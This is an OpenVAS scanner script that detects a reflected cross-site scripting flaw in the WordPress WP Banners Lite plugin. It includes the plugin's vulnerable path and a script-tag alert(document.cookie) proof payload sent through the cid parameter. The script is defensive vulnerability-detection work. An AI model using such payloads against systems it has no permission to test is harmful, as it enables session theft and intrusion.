###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_banners_lite_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  or web script in a user's browser session in context of an affected site.
  Impact Level: Application";

tag_summary = "This host is installed with Wordpress WP Banners Lite Plugin and
  is prone to xss vulnerability.";
tag_solution = "No solution or patch is available as of 26th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/wp-banners-lite";
tag_insight = "The flaw is due to improper validation of user-supplied input to the
  wpbanners_show.php script via cid parameter.";
tag_affected = "Wordpress WP Banners Lite Plugin version 1.40 and prior";

if(description)
{
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_id(803450);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-26 15:56:32 +0530 (Tue, 26 Mar 2013)");
  script_name("Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_xref(name : "URL" , value : "http://www.osvdb.com/91634");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120928");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Mar/209");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wp-banners-lite-140-cross-site-scripting");

  script_description(desc);
  script_summary("Check if WordPress WP Banners Lite Plugin is vulnerable to XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_dir_from_kb(port:port, app:"WordPress")){
  exit(0);
}

## Construct the Attack Request
url = dir + "/wp-content/plugins/wp-banners-lite/wpbanners_show.php?"+
                "id=1&cid=a_<script>alert(document.cookie);</script>";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url,
        pattern:"<script>alert\(document.cookie\);</script>"))
{
  security_warning(port);
  exit(0);
}
